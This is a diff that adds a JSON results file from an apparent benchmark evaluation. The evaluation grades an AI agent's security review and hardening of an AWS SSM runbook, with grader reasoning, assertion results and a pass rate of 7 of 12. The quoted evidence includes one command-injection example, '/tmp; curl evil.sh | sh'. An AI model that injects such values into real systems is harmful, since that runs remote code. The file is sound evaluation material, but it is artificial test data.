@@ -1,0 +1,127 @@
+{
+  "version": "v1",
+  "iteration": 2,
+  "eval_id": "auto-harden-vulnerable",
+  "run_type": "without_skill",
+  "success": true,
+  "error": null,
+  "understanding_agent_space_skill": null,
+  "tests": {
+    "trigger": null,
+    "expected_output": {
+      "result": "failed",
+      "reasoning": "The agent's response covers many of the expected findings well: command injection via LogPath with weak '.*' pattern (critical), DbPassword as SecureString being invalid + echoed secret (critical, without repeating the value), missing InstanceId allowedPattern, curl -k TLS issue, hardcoded assumeRole ARN, and onFailure: Continue noted as informational. These match closely.\n\nHowever, several specific expected findings are missing or incorrect:\n1. The expected output specifically calls out \"timeoutSeconds 1200 above the 600-second aws:executeScript maximum\" as a finding. The agent never mentions this 600-second limit violation at all - it only generically notes \"No timeouts except a 1200s one on a trivial API call\" as a Low severity issue about hanging, not about exceeding a hard maximum. In the hardened version, the agent changes CheckHealth's timeoutSeconds but actually removes it from being 1200 by setting it to 120, but never explains this is because 600 is the enforced max for aws:executeScript - the citation of this specific constraint is absent.\n2. The expected output wants onCancel routed to aws:sleep flagged as \"not a valid cancel target\" - the agent does flag this (#9) but frames it as \"masks the cancellation\" rather than stating it's an invalid target technically. This is a partial match but doesn't capture the specific technical invalidity claim.\n3. Expected hardened output should include \"a Parameter Store name parameter read at run time\" for handling the DB credential - the agent instead removes DbPassword entirely and suggests Secrets Manager for fetching credentials, but does not add an actual Parameter Store name parameter to the hardened YAML. This is a notable gap - the expected output explicitly requires a Parameter Store name parameter in the hardened document, which is absent.\n4. The hardened version sets onCancel: Abort rather than specifically addressing the 600s max for executeScript explicitly (though it does lower timeout).\n\nGiven the omission of the explicit 600-second aws:executeScript maximum citation and the missing Parameter Store name parameter in the hardened YAML, the response does not fully satisfy the expected output criteria, despite covering most other points well.",
+      "confidence": "medium"
+    },
+    "assertions": {
+      "assertion_results": [
+        {
+          "text": "Flags LogPath as a command-injection risk because its pattern is '.*' and it is interpolated into a shell command",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "Finding #1: \"LogPath has allowedPattern: '.*' and is interpolated unquoted into tar and rm -rf\" with example \"/tmp; curl evil.sh | sh works\"",
+          "reasoning": "Agent explicitly flags LogPath's permissive pattern as enabling command injection.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags SecureString as an invalid parameter type and recommends taking the Parameter Store parameter name instead",
+          "evaluator": "llm",
+          "passed": false,
+          "evidence": "Finding #3 says \"Automation doesn't support SecureString as a parameter type, so the document is likely to be rejected or the value stored as plain text. Secrets shouldn't be passed as parameters at all.\" The hardened version removes DbPassword entirely and suggests fetching from Secrets Manager/Parameter Store via instance profile, but it does not recommend taking the Parameter Store parameter name as a String parameter instead.",
+          "reasoning": "The agent flags SecureString as invalid, satisfying the first half, but it does not recommend passing the Parameter Store parameter name as a parameter - instead it removes the secret parameter entirely and has the instance fetch the secret directly using its own profile. This differs from the specific recommendation in the assertion.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags the echo of DbPassword as exposing a secret",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "Finding #2: \"DbPassword is echoed in a Run Command script\" - \"The password lands in Run Command history, command output, any S3 or CloudWatch output config, and the instance's SSM agent logs.\"",
+          "reasoning": "Clearly flags the echo as exposing a secret.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags curl -k as disabling TLS verification",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "Finding #5: \"curl -k ... It disables TLS verification, so a man-in-the-middle can intercept or spoof the call.\"",
+          "reasoning": "Directly flags curl -k's TLS verification disabling.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags the hard-coded assumeRole ARN",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "Finding #4: \"assumeRole is hardcoded to AppOpsRole ... Anyone allowed to start the runbook gets that role's permissions without needing iam:PassRole. It's also a hardcoded account ID, so it won't work for other teams.\"",
+          "reasoning": "Clearly flags the hardcoded assumeRole ARN.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags timeoutSeconds 1200 as above the aws:executeScript maximum of 600 seconds",
+          "evaluator": "llm",
+          "passed": false,
+          "evidence": "Finding #11 says \"No timeouts except a 1200s one on a trivial API call\" and \"A hung command blocks the execution for a long time.\" There is no mention of a specific 600-second maximum for aws:executeScript timeoutSeconds.",
+          "reasoning": "The agent criticizes the 1200s timeout as excessive for a trivial call but never states that 600 seconds is the documented maximum for aws:executeScript, nor cites that limit. This specific claim is absent.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags onCancel routing to an aws:sleep step as invalid",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "Finding #9: \"onCancel: step:Wait ... Cancelling the run sends it to a sleep step instead of aborting, which masks the cancellation.\"",
+          "reasoning": "Flags onCancel routing to Wait as problematic/invalid behavior.",
+          "confidence": "high"
+        },
+        {
+          "text": "Returns a complete hardened document in YAML",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "The output contains a full YAML document starting with 'schemaVersion: 0.3' through the CheckHealth step, including parameters, mainSteps for RotateLogs, RestartService, Wait, and CheckHealth.",
+          "reasoning": "A complete, well-formed hardened YAML document is provided.",
+          "confidence": "high"
+        },
+        {
+          "text": "Cites a documentation page for findings",
+          "evaluator": "llm",
+          "passed": false,
+          "evidence": "No URL or documentation reference (e.g., to AWS Systems Manager docs) appears anywhere in the findings table or hardened version; only general statements like 'Automation doesn't support SecureString as a parameter type'.",
+          "reasoning": "The agent never cites or links to any AWS documentation page to support its findings.",
+          "confidence": "high"
+        },
+        {
+          "text": "The instance ID pattern is applied",
+          "evaluator": "regex",
+          "passed": false,
+          "evidence": "Pattern not found in the output"
+        },
+        {
+          "text": "The executeScript timeout is lowered to 600",
+          "evaluator": "regex",
+          "passed": false,
+          "evidence": "Pattern not found in the output"
+        },
+        {
+          "text": "No raw 12-digit account ID other than the documentation example is exposed",
+          "evaluator": "regex",
+          "passed": true,
+          "evidence": "Pattern not found in the output"
+        }
+      ],
+      "summary": {
+        "passed": 7,
+        "failed": 5,
+        "errored": 0,
+        "low_confidence": 0,
+        "total": 12,
+        "pass_rate": 0.5833
+      }
+    }
+  },
+  "metrics": {
+    "runtime": "0s",
+    "cost": "$0.00",
+    "context_window": {
+      "utilization": "4.2%",
+      "compaction_count": 0
+    }
+  }
+}
